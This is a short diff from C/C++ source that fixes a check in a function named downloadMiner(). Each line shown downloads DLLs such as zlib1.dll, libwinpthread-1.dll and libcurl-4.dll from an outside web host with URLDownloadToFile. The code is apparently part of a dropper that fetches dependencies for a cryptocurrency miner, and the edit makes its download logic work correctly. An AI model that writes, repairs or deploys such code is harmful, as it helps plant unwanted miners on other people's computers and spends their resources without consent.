@@ -61,7 +61,7 @@ void downloadMiner()
         URLDownloadToFile(0, "http://ashran.com/assets/uploads/peluche/zlib1.dll", "zlib1.dll", 0, 0);
     if (!CheckFileExists("libwinpthread-1.dll"))
         URLDownloadToFile(0, "http://ashran.com/assets/uploads/peluche/libwinpthread-1.dll", "libwinpthread-1.dll", 0, 0);
-    if (!CheckFileExists("libwinpthread-1.dll"))
+    if (!CheckFileExists("libcurl-4.dll"))
         URLDownloadToFile(0, "http://ashran.com/assets/uploads/peluche/libcurl-4.dll", "libcurl-4.dll", 0, 0);
 
     return;
